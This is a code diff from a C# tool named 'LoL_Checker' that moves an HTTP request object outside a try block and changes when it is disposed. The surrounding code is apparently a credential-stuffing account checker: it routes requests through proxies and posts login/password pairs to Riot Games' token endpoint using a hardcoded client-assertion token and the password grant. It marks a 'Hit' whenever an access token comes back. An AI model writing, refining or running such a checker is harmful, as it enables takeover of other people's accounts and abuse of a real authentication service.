@@ -53,16 +53,15 @@ namespace LoL_Checker
 
                         while (resultType == ResultType.Invalid)
                         {
+                            MilkyRequest request = Milky.RequestUtils.SetProxy(new MilkyRequest());
+
                             try
                             {
-                                MilkyRequest request = Milky.RequestUtils.SetProxy(new MilkyRequest());
                                 request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
 
                                 string response = Milky.RequestUtils.Execute(request,
                                     HttpMethod.POST, "https://auth.riotgames.com/token",
                                     $"client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username={region}|{Uri.EscapeDataString(login)}&password={Uri.EscapeDataString(password)}&scope=openid").ToString();
-
-                                request.Dispose();
 
                                 if (response.Contains("access_token"))
                                     resultType = ResultType.Hit;
@@ -70,6 +69,8 @@ namespace LoL_Checker
                                     break;
                             }
                             catch { }
+
+                            request.Dispose();
                         }
                     }
 
